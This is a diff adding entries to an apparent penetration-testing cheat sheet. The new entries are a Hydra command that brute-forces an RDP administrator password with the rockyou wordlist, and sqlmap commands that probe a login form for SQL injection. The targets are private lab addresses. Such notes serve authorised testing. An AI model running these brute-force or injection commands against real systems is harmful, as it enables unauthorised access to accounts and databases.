@@ -152,3 +152,30 @@
 #### Create list
 
 `namemash.py names.txt >> possible-usernames.txt`
+
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Hydra
+
+#### Bruteforce RDP password
+
+`hydra -t 1 -V -f -l administrator -P rockyou.txt rdp://192.168.1.1`
+
+<!--
+##################################################################
+##################################################################
+-->
+
+## Sqlmap
+
+#### Run wizard
+
+`sqlmap --wizard`
+
+#### Test a POST request
+
+`sqlmap -u http://192.168.220.141:81/Admin/login.php --data="username=admin&password=admin&login="`
